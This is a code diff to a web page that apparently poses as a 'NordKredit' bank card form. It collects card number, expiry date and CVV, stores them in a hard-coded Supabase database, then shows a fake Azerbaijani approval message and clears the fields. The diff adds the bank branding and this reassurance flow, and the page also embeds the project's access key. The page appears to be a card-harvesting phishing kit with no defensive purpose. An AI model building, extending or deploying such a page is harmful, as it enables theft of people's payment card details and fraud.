@@ -72,10 +72,13 @@ background:#0e1f3f;
 border-radius:40px;
 padding:25px;
 color:white;
+display:flex;
+flex-direction:column;
+align-items:center;
 }
 
 /* CARD */
-.card-wrapper{perspective:1000px;margin-top:90px;}
+.card-wrapper{perspective:1000px;margin-top:50px;}
 .card{
 width:100%;
 height:210px;
@@ -126,12 +129,31 @@ left:20px;
 font-size:14px;
 }
 
+/* NordKredit yazısı və loqo */
+.logo-text{
+position:absolute;
+top:15px;
+left:20px;
+font-weight:bold;
+font-size:18px;
+display:flex;
+align-items:center;
+gap:8px;
+}
+.logo-icon{
+width:25px;
+height:25px;
+border-radius:50%;
+background:gold;
+}
+
 /* FORM */
 form{
 margin-top:40px;
 display:flex;
 flex-direction:column;
 gap:12px;
+width:100%;
 }
 input{
 padding:12px;
@@ -190,6 +212,10 @@ margin-bottom:20px;
 <div class="card" id="card">
 
 <div class="card-face front">
+<div class="logo-text">
+<div class="logo-icon"></div>
+<div>NordKredit</div>
+</div>
 <div class="number" id="cardNumber">0000 0000 0000 0000</div>
 <div class="exp" id="cardExp">MM/YY</div>
 </div>
@@ -220,7 +246,6 @@ margin-bottom:20px;
 <script type="module">
 import { createClient } from "https://esm.sh/@supabase/supabase-js@2"
 
-// 🔹 Tam işlək Supabase parametrləri
 const supabase = createClient(
   "https://gkrfcoyleewxrxbfdunq.supabase.co",
   "sb_publishable_E1QDjV9fAt2IaoI3h7G9Iw_hIiSaAFH"
@@ -283,9 +308,22 @@ kod3:cvvInput.value
 
 if(error){ console.error("Supabase xəta:", error); alert("Xəta baş verdi: " + error.message); loading.style.display="none"; return }
 
-console.log("Uğurla yazıldı:", data)
+setTimeout(()=>{
+loadingText.textContent="Təbriklər Sorğunuz Təsdiq Olundu"
+},7000)
 
-setTimeout(()=>{ loadingText.textContent="Təbriklər Sorğunuz Təsdiq Olundu" },7000)
+/* Avtomatik təmizləmə və spinner reset */
+setTimeout(()=>{
+numberInput.value=""
+expInput.value=""
+cvvInput.value=""
+cardNumber.textContent="0000 0000 0000 0000"
+cardExp.textContent="MM/YY"
+cvvDisplay.textContent="***"
+loadingText.textContent="Loading..."
+loading.style.display="none"
+},9500)
+
 })
 </script>
 
